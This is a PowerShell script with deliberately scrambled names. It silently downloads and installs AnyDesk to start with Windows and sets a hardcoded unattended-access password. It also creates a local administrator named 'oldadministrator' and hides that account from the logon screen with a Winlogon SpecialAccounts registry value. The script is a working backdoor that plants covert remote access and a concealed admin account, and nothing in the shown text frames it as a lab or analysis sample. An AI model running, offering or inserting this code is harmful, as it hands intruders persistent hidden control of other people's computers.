function Invoke-ZxYv {
    param (
        [string]$qGkL = "C:\ProgramData\AnyDesk",
        [string]$RtYh = "http://download.anydesk.com/AnyDesk.exe",
        [string]$UzPm = "Passw0rd125@",
        [string]$BgNd = "oldadministrator",
        [string]$KvWs = "Passw0rd125@"
    )

    try {
        if (-not (Test-Path -Path $qGkL -PathType Container)) {
            New-Item -Path $qGkL -ItemType Directory | Out-Null
        }

        $xTaR = Join-Path -Path $qGkL -ChildPath "AnyDesk.exe"
        Invoke-WebRequest -Uri $RtYh -OutFile $xTaR

        Start-Process -FilePath $xTaR -ArgumentList "--install $qGkL --start-with-win --silent" -Wait | Out-Null
        Start-Process -FilePath $xTaR -ArgumentList "--set-password=$UzPm" -Wait | Out-Null

        $secure = ConvertTo-SecureString -String $KvWs -AsPlainText -Force
        New-LocalUser -Name $BgNd -Password $secure | Out-Null
        Add-LocalGroupMember -Group "Administrators" -Member $BgNd

        $regKey = 'HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList'
        Set-ItemProperty -Path $regKey -Name $BgNd -Value 0 -Type DWORD -Force

        Start-Process -FilePath $xTaR -ArgumentList "--get-id" -Wait | Out-Null
        Write-Host "Done.`n"
    }
    catch {
        Write-Host "Oops: $_"
    }
}

Invoke-ZxYv
